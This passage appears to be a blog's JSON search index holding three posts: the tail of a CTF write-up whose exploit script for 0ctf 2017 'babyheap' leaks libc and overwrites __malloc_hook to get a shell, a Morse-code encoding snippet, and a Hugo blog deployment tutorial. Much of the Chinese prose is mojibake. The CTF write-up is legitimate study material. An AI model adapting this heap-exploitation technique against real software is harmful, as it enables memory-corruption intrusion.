formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) # sendline_after_clean(str(index)) sendline_after_clean(str(size)) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) def show(index: int): sendline_after_clean(b\u0026#34;4\u0026#34;) sendline_after_clean(str(index)) def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(len(content))) send_after_clean(content) allocate(0x10) # 0 allocate(0x10) # 1 allocate(0x80) # 2 allocate(0x30) # 3 allocate(0x68) # 4 allocate(0x10) # 5 # gdb.attach(p) payload = flat({0x10:[ pg(0), pg(0xB1) ]}) change(0, payload) # gdb.attach(p) remove(1) # -1 payload = flat([ pg(0)*3, pg(0x91) ]) allocate(0xA0) # 1 change(1, payload) remove(2) # -2 # gdb.attach(p) show(1) p.recvuntil(\u0026#34;Content: \\n\u0026#34;) p.recv(0x20) libc_addr = recv_and_transform() -0x3c4b78 hook_addr = libc_addr + libc.sym[\u0026#39;__malloc_hook\u0026#39;] chunk_addr = hook_addr - 0x23 one_gadget = libc_addr + 0x4526a suclog( \u0026#34;libc_addr\u0026#34;, \u0026#34;hook_addr\u0026#34;, \u0026#34;chunk_addr\u0026#34;, \u0026#34;one_gadget\u0026#34;, ) payload = flat([ pg(0)*7, pg(0x71), pg(chunk_addr) ]) remove(4) # -4 change(3, payload) allocate(0x68) # 2 allocate(0x68) # 4 payload = flat({(0x13):[ one_gadget ]}) change(4, payload) # gdb.attach(p) allocate(0x100) interactive_after_clean() ","date":"2023å¹´01æœˆ09æ—¥","permalink":"https://peterliuzhi.top/writeup/0ctf_2017_babyheap/","section":"writeup","summary":"The best preparation for tomorrow is doing your best today. â€” H. Jackson Brown Jr. åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  å…¸å‹èœå•é¢˜ï¼Œæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯ï¼Œå®ƒä½¿ç”¨äº†ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸ªç»“æ„ä½“å†…çš„c","tags":["pwn","chunk overlap","fastbin attack","main_arena leak"],"title":"0ctf_2017_babyheap"},{"categories":["tricks"],"contents":" Strong beliefs win strong men, and then make them stronger. â€” Richard Bach\nä»éŸ³é¢‘åˆ°è‹±æ–‡å•è¯ Morse Code Adaptive Audio Decoder | Morse Code Worldè¿™ä¸ªç½‘ç«™å¯ä»¥è§£æè«æ–¯ç”µç éŸ³é¢‘\næˆ–è€…ä½¿ç”¨DataBorder Morse Code Sound \u0026amp; Vibration Listenerï¼Œå¯ä»¥è®¾ç½®é˜ˆé™å€¼ï¼Œå¯ä»¥è¯†åˆ«å‡ºä¸‹åˆ’çº¿ï¼ˆä½†æ˜¯è¡¨ç¤ºä¸º#ï¼‰\nè§£ææ‘©æ–¯ç”µç éŸ³é¢‘éœ€è¦ç”¨åˆ°AIï¼ˆéAIéœ€è¦æ‰‹å·¥è°ƒè¯•é˜ˆé™å€¼ï¼‰ï¼Œç½‘ç«™èƒ½æå°±ç”¨ç½‘ç«™æå§ï¼Œæ–¹ä¾¿ç‚¹\nä»è‹±æ–‡å•è¯åˆ°æ‘©æ–¯ç”µç  morse_code_dict = { \u0026#39;a\u0026#39;: \u0026#39;.-\u0026#39;, \u0026#39;b\u0026#39;: \u0026#39;-...\u0026#39;, \u0026#39;c\u0026#39;: \u0026#39;-.-.\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;-..\u0026#39;, \u0026#39;e\u0026#39;: \u0026#39;.\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;..-.\u0026#39;, \u0026#39;g\u0026#39;: \u0026#39;--.\u0026#39;, \u0026#39;h\u0026#39;: \u0026#39;....\u0026#39;, \u0026#39;i\u0026#39;: \u0026#39;..\u0026#39;, \u0026#39;j\u0026#39;: \u0026#39;.---\u0026#39;, \u0026#39;k\u0026#39;: \u0026#39;-.-\u0026#39;, \u0026#39;l\u0026#39;: \u0026#39;.-..\u0026#39;, \u0026#39;m\u0026#39;: \u0026#39;--\u0026#39;, \u0026#39;n\u0026#39;: \u0026#39;-.\u0026#39;, \u0026#39;o\u0026#39;: \u0026#39;---\u0026#39;, \u0026#39;p\u0026#39;: \u0026#39;.--.\u0026#39;, \u0026#39;q\u0026#39;: \u0026#39;--.-\u0026#39;, \u0026#39;r\u0026#39;: \u0026#39;.-.\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;...\u0026#39;, \u0026#39;t\u0026#39;: \u0026#39;-\u0026#39;, \u0026#39;u\u0026#39;: \u0026#39;..-\u0026#39;, \u0026#39;v\u0026#39;: \u0026#39;...-\u0026#39;, \u0026#39;w\u0026#39;: \u0026#39;.--\u0026#39;, \u0026#39;x\u0026#39;: \u0026#39;-..-\u0026#39;, \u0026#39;y\u0026#39;: \u0026#39;-.--\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;--..\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;-----\u0026#39;, \u0026#39;1\u0026#39;: \u0026#39;.----\u0026#39;, \u0026#39;2\u0026#39;: \u0026#39;..---\u0026#39;, \u0026#39;3\u0026#39;: \u0026#39;...--\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;....-\u0026#39;, \u0026#39;5\u0026#39;: \u0026#39;.....\u0026#39;, \u0026#39;6\u0026#39;: \u0026#39;-....\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;--...\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;---..\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;----.\u0026#39;, \u0026#39; \u0026#39;: \u0026#39;/\u0026#39; } def encode_morse(latin_string): ## å°†æ‹‰ä¸æ–‡å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ‘©å°”æ–¯ç”µç  morse_code = \u0026#39;\u0026#39; for char in latin_string: morse_code += morse_code_dict[char.lower()] + \u0026#39;/\u0026#39; return morse_code.strip() latin_string = \u0026#39;0 2 2 3 E P R I I B L Y H O N W A J M G H F G K C Q A O Q T M F R\u0026#39;.replace(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;) print(encode_morse(latin_string)) ä¹Ÿå¯ä»¥ä½¿ç”¨ç½‘ç«™æˆ–è€…Best Morse Code Translator Online with Audio Play\næˆ–è€…ä½¿ç”¨GitHub - HestStudio/MorseCoder: ä¸€ä¸ªå…³äºæ‘©æ–¯å¯†ç è§£å¯†ä¸åŠ å¯†çš„åº“ / A library about encoding and decoding Morse code.\nç›¸å…³é˜…è¯»ï¼š\nåˆ©ç”¨pythonè‡ªåŠ¨è§£ææ‘©æ–¯ç”µç éŸ³é¢‘æ–‡ä»¶_Rabbit_Grayçš„åšå®¢-CSDNåšå®¢_å¦‚ä½•ä»éŸ³é¢‘ä¸­æå–æ‘©æ–¯å¯†ç  ","date":"2023å¹´01æœˆ09æ—¥","permalink":"https://peterliuzhi.top/tricks/%E6%91%A9%E6%96%AF%E7%94%B5%E7%A0%81%E7%9A%84%E8%A7%A3%E7%A0%81/","section":"tricks","summary":"Strong beliefs win strong men, and then make them stronger. â€” Richard Bach ä»éŸ³é¢‘åˆ°è‹±æ–‡å•è¯ Morse Code Adaptive Audio Decoder | Morse Code Worldè¿™ä¸ªç½‘ç«™å¯ä»¥è§£æè«æ–¯ç”µç éŸ³é¢‘ æˆ–è€…ä½¿ç”¨DataBorder Morse Code Sound \u0026amp; Vibration Listener","tags":["misc","morse"],"title":"æ‘©æ–¯ç”µç çš„è§£ç "},{"categories":["posts"],"contents":" Serious sport has nothing to do with fair play. It is bound up with hatred, jealousy, boastfulness, disregard of all rules and sadistic pleasure in witnessing violence. In other words, it is war minus the shooting. â€” George Orwell\nå®‰è£… hugo hugo ä¸­æ–‡æ–‡æ¡£\nåœ¨releases ç•Œé¢ä¸‹è½½ hugo çš„ exe æ–‡ä»¶ï¼ˆwindowså¯ä»¥ä½¿ç”¨chocoå®‰è£…ï¼‰ï¼Œmac ç”¨æˆ·å¯ä»¥ä½¿ç”¨brew install hugo\nå¦‚æœè¦æ›´æ–° hugo çš„æ‰€æœ‰ä¾èµ–åº“ï¼Œä½¿ç”¨å‘½ä»¤go get -u -v github.com/gohugoio/hugoï¼Œæ³¨æ„ï¼Œhugo ä¸­æ–‡æ–‡æ¡£ä¸­ç»™å‡ºçš„ GitHub åœ°å€æ˜¯å·²ç»è¿‡æœŸçš„ï¼Œè¿è¡Œåä¼šå«ä½ ä»è¿™ä¸ªåœ°å€ä¸‹è½½ï¼ˆå¯ä»¥è¯•è¯•ï¼‰\nä½¿ç”¨ hugo ç”Ÿæˆç«™ç‚¹ä¸æ–‡ç« ï¼Œå¹¶åœ¨æœ¬åœ°æŸ¥çœ‹ ä½¿ç”¨å‘½ä»¤hugo new site MyBlogç”Ÿæˆä¸€ä¸ªåšå®¢æ–‡ä»¶å¤¹\nä½¿ç”¨å‘½ä»¤hugo new posts\\intro.mdï¼Œè¿™ä¸ªå‘½ä»¤ä¼šåœ¨æœ¬æ¥ä¸ºç©ºçš„ content æ–‡ä»¶å¤¹ä¸‹æ–°å»º posts æ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨ posts æ–‡ä»¶å¤¹å†…æ–°å»º intro.md æ–‡ä»¶ã€‚å¦‚æœä½ ä¸å–œæ¬¢ posts è¿™ä¸ªåå­—ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ã€‚\nå®‰è£… hugo ä¸»é¢˜ï¼Œç¾åŒ–ä½ çš„åšå®¢ hugo æœ‰ä¸€ä¸ª themes æ–‡ä»¶å¤¹ï¼Œä½¿ç”¨cd themesè¿›å…¥è¯¥æ–‡ä»¶å¤¹ï¼Œåœ¨hugo å®˜æ–¹çš®è‚¤ç½‘ç«™æŒ‘é€‰ä¸€ä¸ªå–œæ¬¢çš„ä¸»é¢˜ï¼Œä½¿ç”¨ git ä¸‹è½½\nè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯wangchuchengæä¾›çš„Eurekaä¸»é¢˜ï¼Œé¡µé¢ç®€æ´ç¾è§‚ï¼Œæœ‰äº›åŠŸèƒ½å¾ˆå®Œå–„ï¼Œä½†æ˜¯æœ‰äº›åŠŸèƒ½æ²¡æœ‰ï¼Œæœ¬æ•™ç¨‹ä¼šåœ¨åé¢è¯´æ˜å¢åŠ æ–¹æ³•\nè¯·ä»”ç»†é˜…è¯»å…¥é—¨ - Hugo Eureka | WANG Chuchengä¸‹è½½å®‰è£…è¯¥ä¸»é¢˜ï¼Œæœ¬æ•™ç¨‹ä¹‹åéƒ½æ˜¯å›´ç»•è¯¥ä¸»é¢˜è¿›è¡Œï¼Œå¦‚æœä½ å–œæ¬¢å…¶ä»–ä¸»é¢˜ï¼Œå¯ä»¥æŸ¥é˜…å®ƒçš„å®˜æ–¹æ–‡æ¡£\nğŸ’¡è¯·é˜…è¯»å®Œä¸»é¢˜æ–‡æ¡£å†å‘ä¸‹é˜…è¯»ï¼Œä»¥ä¸‹å†…å®¹åŸºæœ¬éƒ½æ˜¯è¿›é˜¶å†…å®¹\nä½¿ç”¨ GitHub çš„ pages åŠŸèƒ½å‘å¸ƒä½ çš„ç½‘é¡µ è¿™æ—¶å€™æˆ‘ä»¬æƒ³çœ‹ä¸€ä¸‹åšå®¢çš„æ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨hugo -D serverå‘½ä»¤åœ¨æœ¬åœ°æŸ¥çœ‹ã€‚-D é€‰é¡¹é»˜è®¤åœ¨ public æ–‡ä»¶å¤¹ç”Ÿæˆé¡µé¢ï¼Œå¦‚æœä½ æƒ³åœ¨ docs/æ–‡ä»¶å¤¹ç”Ÿæˆé¡µé¢ï¼Œå°±ä½¿ç”¨hugo -d docså†hugo server\nè¿™æ—¶å€™ç»ˆç«¯ä¼šè¹¦å‡ºä¸€ä¸ªç±»ä¼¼//localhost:1313/çš„åœ°å€ï¼Œåœ¨æµè§ˆå™¨ä¸­è¾“å…¥è¯¥åœ°å€å°±èƒ½çœ‹åˆ°æœ¬åœ°ç”Ÿæˆçš„åšå®¢å•¦\nå¦‚æœæƒ³åœæ­¢æœ¬åœ°æœåŠ¡å™¨å°±ctrl+cå³å¯\nä½†æ˜¯æˆ‘ä»¬çš„åšå®¢ä¸å¯èƒ½åªç»™æˆ‘ä»¬è‡ªå·±çœ‹å•Šï¼Œæˆ‘ä»¬å¸Œæœ›è®©äº’è”ç½‘ä¸Šçš„å¤§å®¶éƒ½çœ‹åˆ°ã€‚è¿™æ—¶å€™æˆ‘ä»¬æœ‰å‡ ä¸ªé€‰æ‹©ï¼š\nè´­ä¹°è‡ªå·±çš„äº‘æœåŠ¡å™¨ï¼Œä»·æ ¼æ¯”è¾ƒæ˜‚è´µï¼Œä½†æ˜¯ä¹Ÿæœ‰æ–°äººç¦åˆ©ï¼Œèƒ½å®ç°æ›´å¤šåŠŸèƒ½ï¼Œé…Œæƒ…è€ƒè™‘ ä½¿ç”¨ GitHub çš„ pages æœåŠ¡ï¼Œä½œè€…ç”¨çš„å°±æ˜¯è¿™ä¸ª ä½¿ç”¨ gitee çš„ pages æœåŠ¡ï¼Œåœ¨å›½å†…ä¼šå¿«ä¸€ç‚¹ï¼Œä½†æ˜¯éœ€è¦ä¸Šä¼ å„ç§æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚æ‰‹æŒèº«ä»½è¯ç…§ç‰‡ï¼Œè€Œä¸”éœ€è¦å®¡æ ¸ï¼Œé…Œæƒ…é€‰æ‹© æ³¨å†Œ GitHub è´¦å· è°·æ­Œ GitHub æŒ‰æŒ‡å¼•æ³¨å†Œå³å¯\nåˆ›å»ºä¸€ä¸ªæ–°çš„ä»“åº“ï¼ˆrepositoryï¼‰ ä»“åº“åæœ€å¥½æ˜¯\u0026lt;ä½ çš„ç”¨æˆ·å\u0026gt;.github.ioï¼Œæ¯”å¦‚æˆ‘å°±æ˜¯ peterliu-all.github.ioï¼Œå¦‚æœä¸æ˜¯è¿™ä¸ªåå­—å¯èƒ½ä¼šæœ‰ä¸€äº›æœªçŸ¥çš„é”™è¯¯ã€‚\ndescription éšä¾¿å†™ä¸€ä¸‹ï¼Œä¸€å®šè¦è®¾ç½®ä¸º pubicï¼Œä¸€å¼€å§‹å…ˆä¸è¦åŠ åˆ«çš„æ–‡ä»¶ï¼ˆä¸è¦ç‚¹ä¸‹é¢çš„ add readmeã€license ç­‰ï¼‰ï¼Œè®©ä»“åº“ä¸ºç©º\nç„¶åå¤åˆ¶ä¸€ä¸‹ä»“åº“çš„ https åœ°å€\nç„¶åè¿”å›æˆ‘ä»¬çš„ç»ˆç«¯ï¼Œåœ¨ä½ çš„åšå®¢æ ¹ç›®å½•ä¸‹è¾“å…¥hugoï¼Œè¿™ä¼šå¿½ç•¥frontmatteræ ‡è®°draft: trueï¼Œå¦‚æœä¸æƒ³å¿½ç•¥è‰ç¨¿ï¼Œå°±è¾“å…¥hugo -D\nç„¶åæˆ‘ä»¬è¿›å…¥ public æ–‡ä»¶å¤¹ï¼ˆæˆ–è€…ä½ æŒ‡å®šçš„ç”Ÿæˆé¡µé¢çš„æ–‡ä»¶å¤¹ï¼Œæ¯”å¦‚ docsï¼‰ï¼Œè¾“å…¥ä¸‹åˆ—å‘½ä»¤ï¼š\ngit init \u0026lt;br\u0026gt; git remote add origin \u0026lt;ä½ å¤åˆ¶çš„githubç»™çš„httpsé“¾æ¥\u0026gt; git add -A . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master ç„¶åç­‰ä¸€ä¼šï¼ˆå¯ä»¥è¿›å…¥ä»“åº“-\u0026gt;action æŸ¥çœ‹è¿›åº¦ï¼‰å°±è¿›å…¥æˆ‘ä»¬çš„ä»“åº“-\u0026gt;settings-\u0026gt;pages å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„é¡µé¢ç½‘å€æ˜¯https://\u0026lt;ç”¨æˆ·å\u0026gt;.github.io/å•¦\nåœ¨å®ƒbuildå®Œå‰æŸ¥çœ‹æˆ–è€…buildå®Œé©¬ä¸ŠæŸ¥çœ‹å¯èƒ½ä¼šå‡ºç°æ— æ ·å¼çš„æƒ…å†µ\nè‡ªåŠ¨buildåä¸Šä¼ è„šæœ¬ å°†ä¸‹é¢çš„å‘½ä»¤ä¿å­˜ä¸ºupload.ps1è„šæœ¬ï¼ˆWindows ä¸‹çš„ powershell ä½¿ç”¨ï¼‰\nå…¶ä¸­çš„pythonè„šæœ¬è§å›¾ç‰‡ä¸Šä¼ é—®é¢˜\n$others = $args[1..($args.Length - 1)] If ([String]::IsNullOrWhiteSpace($args[0])) { ## è¿™æ˜¯ä½œè€…è‡ªå®šä¹‰çš„é¢„å¤„ç†æ–‡ç« çš„pythonè„šæœ¬ python dispose_image.py false } else { python dispose_image.py $args[0] } hugo -v --log cd public git add -A . If ([String]::IsNullOrWhiteSpace(\u0026#34;$others\u0026#34;)){ git commit -m \u0026#34;$(date)\u0026#34; } else { git commit -m \u0026#34;$others\u0026#34; } git push origin master cd .. å…¶ä¸­ç¬¬ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ä¼šä¼ é€’ç»™pythonè„šæœ¬ï¼Œå€¼ä¸ºtrueæˆ–falseï¼Œå…·ä½“è§å›¾ç‰‡ä¸Šä¼ é—®é¢˜\nç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯git commitçš„æ›´æ–°ä¿¡æ¯\nä»¥åå°±å¯ä»¥ä½¿ç”¨.\\upload.ps1 false \u0026quot;\u0026lt;æ›´æ–°message\u0026gt;\u0026quot;æ¥ä¸Šä¼ å•¦\nå…¶ä»–å¹³å°å¯ä»¥ä½¿ç”¨upload.pyï¼š\nimport os import sys import time if len(sys.argv) \u0026lt; 2: os.system(\u0026#34;python dispose_image.py false\u0026#34;) else: os.system(f\u0026#34;python dispose_image.py {sys.argv[1]}\u0026#34;) os.system(\u0026#34;hugo -v --log\u0026#34;) os.chdir(\u0026#34;public\u0026#34;) os.system(\u0026#34;git add -A .\u0026#34;) if len(sys.argv) \u0026lt;= 2: os.system(f\u0026#39;git commit -m \u0026#34;{time.strftime(\u0026#34;%Y-%m-%dT%H:%M:%S+08:00\u0026#34;, time.localtime())}\u0026#34;\u0026#39;) else: os.system(f\u0026#39;git commit -m \u0026#34;{sys.argv[2:]}\u0026#34;\u0026#39;) os.system(\u0026#34;git push origin master\u0026#34;) æœ¬åœ°æ¸²æŸ“æˆ‘ä¹Ÿå†™äº†ä¸€ä¸ªè„šæœ¬ï¼Œåä¸º.\\local.ps1ï¼š\nIf ([String]::IsNullOrWhiteSpace($args[0])) { python dispose_image.py false } else { python dispose_image.py $args[0] } hugo -v --log hugo server --disableFastRender ä½¿ç”¨æ–¹æ³•æ˜¯.\\local.ps1æˆ–.\\local.ps1 trueæ¥è¿›è¡Œæœ¬åœ°æ¸²æŸ“äº†\nå…¶ä»–å¹³å°å¯ä»¥ä½¿ç”¨local.pyï¼š\nimport os import sys if len(sys.argv) \u0026lt; 2: os.system(\u0026#34;python dispose_image.py false\u0026#34;) else: os.system(f\u0026#34;python dispose_image.py {sys.argv[1]}\u0026#34;) os.system(\u0026#34;hugo -v --log\u0026#34;) try: os.system(\u0026#34;hugo server --disableFastRender\u0026#34;) except KeyboardInterrupt: print(\u0026#34;å·²é€€å‡º\u0026#34;) except Exception as e: print(f\u0026#34;å‡ºç°é”™è¯¯ï¼š{e}\u0026#34;) å›¾ç‰‡ä¸Šä¼ é—®é¢˜ æˆ‘ä»¬å¯ä»¥è´­ä¹°é˜¿é‡Œäº‘ç­‰æœåŠ¡ä¾›åº”å•†çš„å›¾åºŠæœåŠ¡ï¼ˆOSSæœåŠ¡ï¼‰ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨GitHubä¿å­˜å›¾ç‰‡\nEurekaä¸»é¢˜æä¾›äº†ä¸€ç³»åˆ—çš„ä¸Šä¼ å›¾ç‰‡çš„æ–¹æ³•ï¼Œè¯¦æƒ…è§æ–‡æ¡£\nç°åœ¨åªéœ€è¦çŸ¥é“ä¸¤ç‚¹ï¼š\nå›¾ç‰‡å¯ä»¥ä¿å­˜åœ¨/assets/imagesä¸­ï¼Œè°ƒç”¨å›¾ç‰‡çš„æ—¶å€™markdownè¯­æ³•ç±»ä¼¼äº![](/images/example.png) å›¾ç‰‡å¯ä»¥ä¿å­˜åœ¨/content/imageä¸­ï¼Œè°ƒç”¨å›¾ç‰‡çš„æ—¶å€™markdownè¯­æ³•ç±»ä¼¼äº![](/image/example.png) æ€»ä¹‹å­˜æ”¾å›¾ç‰‡/é™„ä»¶çš„æ–‡ä»¶å¤¹åœ¨buildçš„æ—¶å€™ä¼šè¢«ç§»åŠ¨åˆ°æ ¹ç›®å½•\nå› æ­¤æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ç‚¹ä½¿ç”¨obsidianè¿›è¡Œæ— ç¼è¡”æ¥\næˆ‘ä»¬å°†ä»“åº“è®¾åœ¨contentæ–‡ä»¶å¤¹ï¼Œè®¾ç½®ç²˜è´´å›¾ç‰‡æ—¶çš„é“¾æ¥ä¸ºç›¸å¯¹ä»“åº“æ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼š\nè¿™æ ·ç²˜è´´example.pngçš„æ—¶å€™ç”Ÿæˆçš„å›¾ç‰‡é“¾æ¥å°±æ˜¯![](image/example.png)ï¼Œä½†æ˜¯å¦‚æœimageå‰æ²¡æœ‰\u0026quot;/\u0026quot;ï¼Œé‚£ä¹ˆè¿™ä¸ªé“¾æ¥ä¼šè¢«æµè§ˆå™¨è¯†åˆ«ä¸ºç›¸å¯¹é“¾æ¥ï¼Œä¸ä¼šæŒ‡å‘æ ¹ç›®å½•ä¸‹çš„imageæ–‡ä»¶å¤¹ï¼Œå¦‚æœæ‰‹åŠ¨æ›´æ”¹ä¸º![](/image/example.png)ï¼Œä¼šå‘ç°obsidianå’Œæµè§ˆå™¨éƒ½èƒ½æ­£ç¡®æ‰¾åˆ°å›¾ç‰‡å¹¶å±•ç¤ºï¼Œé‚£ä¹ˆè¯¥æ€ä¹ˆè‡ªåŠ¨åŒ–å®ç°è¿™ç‚¹å‘¢ï¼Ÿ\nä½œè€…çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨ä¸€ä¸ªpythonè„šæœ¬è‡ªåŠ¨è§£æå¹¶æ›¿æ¢æ‰€æœ‰çš„å›¾ç‰‡é“¾æ¥å’Œé™„ä»¶é“¾æ¥ï¼Œå°†ä¸‹åˆ—ä»£ç ä¿å­˜ä¸ºdispose_image.pyå¹¶å¯¹ä¸Šé¢ç»™çš„ä»£ç ä¸­çš„python dispose_image.pyå–æ¶ˆæ³¨é‡Š\nimport re import os import sys from os.path import * redispose = False redispose = True if sys.argv[-1] == \u0026#34;true\u0026#34; else False ## å¿½ç•¥çš„æ–‡ä»¶å¤¹å’Œæ–‡ä»¶åå­—ï¼Œæ³¨æ„ï¼Œåªèƒ½è¯†åˆ«è·¯å¾„ä¸­æœ€åä¸€ä¸ªåå­— ignore = [\u0026#34;image\u0026#34;, \u0026#34;model\u0026#34;, \u0026#34;archive\u0026#34;, \u0026#34;stats\u0026#34;, \u0026#34;search.md\u0026#34;, \u0026#34;Excalidraw\u0026#34;, \u0026#34;draw.io\u0026#34;, \u0026#34;appendix\u0026#34; \u0026#34;Chromium OS Docs - Linux System Call Table\u0026#34;, \u0026#34;subscribe\u0026#34;] ## image: Trueè¡¨ç¤ºimageæ–‡ä»¶å¤¹æ˜¯ä¸€ä¸ªä¿å­˜å›¾ç‰‡çš„æ–‡ä»¶å¤¹ï¼ŒFalseè¡¨ç¤ºä¿å­˜é™„ä»¶ check_folder = {\u0026#34;image\u0026#34;: True, \u0026#34;appendix\u0026#34;: False} all_pat = {folder:re.compile(f\u0026#34;!\\[(.*)\\]\\({folder}(.*)\\)\u0026#34;) if jud else re.compile(f\u0026#34;\\[(.*)\\]\\({folder}(.*)\\)\u0026#34;) for folder, jud in check_folder.items()} ## D:\\database_BooksAndFiles\\Blog\\fnlblog\\test\\test.md ## é€’å½’åœ°å¤„ç†æ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹ï¼ŒåŒ…æ‹¬å­æ–‡ä»¶å¤¹çš„å†…å®¹ def dispose(folder: str): global ignore dirs = os.listdir(folder) for file in dirs: if not (file.startswith(\u0026#34;.\u0026#34;) or file in ignore): print(f\u0026#34;[+]{file}\u0026#34;) fullpath = join(abspath(folder), file) if isfile(fullpath) and splitext(file)[1].strip(\u0026#34; \\n\u0026#34;) == \u0026#34;.md\u0026#34;: lines = [] flag = True start = 0 font_matter: int = 0 with open(fullpath, \u0026#34;r\u0026#34;, encoding=\u0026#34;UTF-8\u0026#34;) as f: for i, line in enumerate(f.readlines()): if line.strip(\u0026#34;\\n\u0026#34;).strip() == \u0026#34;---\u0026#34;: if font_matter == 0: font_matter = 1 start = i elif font_matter == 1: font_matter = 2 elif font_matter == 1 and not redispose: opt = line.split(\u0026#34;:\u0026#34;) if opt[0].strip() == \u0026#34;dispose\u0026#34; and \u0026#34;true\u0026#34; in opt[1]: ## å¦‚æœfrontmatterä¸­å­˜åœ¨dispose: trueï¼Œé‚£ä¹ˆå°±ä¸å¤„ç†è¯¥æ–‡ä»¶ flag = False print(\u0026#34;dispose=Trueï¼Œå·²ç»è¿‡å¤„ç†\u0026#34;) break elif font_matter == 2: for fd, pat in all_pat.items(): for match in pat.finditer(line): line = pat.sub( f\u0026#34;![{match.group(1)}](/{fd}{match.group(2)})\u0026#34;, line) \\ if check_folder[fd] == True \\ else f\u0026#34;[{match.group(1)}](/{fd}{match.group(2)})\u0026#34; print(line, end= \u0026#34;\u0026#34; if line.endswith(\u0026#34;\\n\u0026#34;) else \u0026#34;\\n\u0026#34;) lines.append(line) if flag and len(lines) \u0026gt; 0: with open(fullpath, \u0026#34;w\u0026#34;, encoding=\u0026#34;UTF-8\u0026#34;) as f: f.writelines(lines[:start+1]) if not redispose: ## å¤„ç†è¿‡çš„æ–‡ä»¶ä¼šåœ¨frontmatterä¸­åŠ ä¸Šdispose: true f.write(\u0026#34;dispose: true\\n\u0026#34;) f.writelines(lines[start+1:]) elif isdir(fullpath): dispose(join(folder, file)) dispose(\u0026#34;content\u0026#34;) è¿™ä¸ªè„šæœ¬ä¼šè§£æå®ƒçš„å‘½ä»¤è¡Œå‚æ•°ï¼Œå¦‚æœä¼ å…¥sys.argv[1] == \u0026quot;true\u0026quot;ï¼Œé‚£ä¹ˆå®ƒå°±ä¸ä¼šç®¡frontmatterä¸­dispose: trueé¡¹ï¼Œä¸€è§†åŒä»åœ°å¯¹æ‰€æœ‰æ–‡ä»¶è¿›è¡Œè§£æï¼Œä½†è¿™å¯èƒ½ä¼šæµªè´¹æ—¶é—´ï¼Œæ‰€ä»¥å»ºè®®ä¼ å…¥falseæˆ–è€…ä»€ä¹ˆéƒ½ä¸ä¼ å…¥ï¼Œè¿™æ ·ç¨‹åºä¼šä¸è§£æfrontmatterä¸­æœ‰dispose: trueé¡¹çš„æ–‡ä»¶\nfontawesomeå°æ’å›¾æ— æ³•æ˜¾ç¤ºçš„é—®é¢˜ hugoä¸­å¾ˆå¤šæ—¶å€™éƒ½ä¼šç”¨åˆ°fontswesomeçš„å°æ’å›¾ï¼Œä½†æ˜¯Eurekaä¸­å¥½åƒæœ‰bugæ— æ³•æ˜¾ç¤º\nè§£å†³æ–¹æ³•å°±æ˜¯æ³¨å†Œä¸€ä¸‹fontswesomeå¹¶ç‚¹å‡»è·å–kit codeä»£æ›¿/themes/eureka/layouts/partials/head.htmlä¸­åŸæœ¬çš„é“¾æ¥ï¼š\nä½¿ç”¨ disqus æ·»åŠ è¯„è®ºåŠŸèƒ½ Eurekaä¸­å®ç°è¿™ç‚¹éå¸¸ç®€å•ï¼Œä½ åªéœ€è¦æ³¨å†Œdisquså¹¶è·å–shortnameï¼Œå¡«åœ¨params.yamlä¸­å°±è¡Œï¼š ç›¸å…³é˜…è¯»ï¼š\nç»™Hugoæ·»åŠ disqusè¯„è®ºæœåŠ¡ | Marvin\u0026rsquo;s Blogã€ç¨‹å¼äººç”Ÿã€‘\nåœ¨ä»£ç æ—å¢åŠ å¤åˆ¶æŒ‰é’® åœ¨æ ¹ç›®å½• /static/css/ å’Œ /static/js/ åˆ†åˆ«åˆ›å»º copy-btn.css å’Œ copy-btn.jsï¼Œåˆ†åˆ«å†™å…¥ï¼š\n.highlight { position: relative; } .highlight td:first-child { user-select: none; } .highlight pre { padding-right: 75px; /* background-color: #f8f8f8 !important; */ } .highlight-copy-btn { position: absolute; top: 7px; right: 7px; border: 0; border-radius: 4px; padding: 1px; font-size: 0.8em; line-height: 1.8; /* color: #fff; background-color: #777; */ min-width: 55px; text-align: center; transition: 0.1s; opacity: 0.8; } .highlight-copy-btn:hover { opacity: 1; filter: drop-shadow(16px 16px 20px rgba(163, 163, 163, 0.178)); } // add-copy-btn.js (function () { \u0026#34;use strict\u0026#34;; if (!document.queryCommandSupported(\u0026#34;copy\u0026#34;)) { return; } function flashCopyMessage(el, msg) { el.textContent = msg; setTimeout(function () { el.textContent = \u0026#34;Copy\u0026#34;; }, 1000); } function selectText(node) { var selection = window.getSelection(); var range = document.createRange(); range.selectNodeContents(node); selection.removeAllRanges(); selection.addRange(range); return selection; } 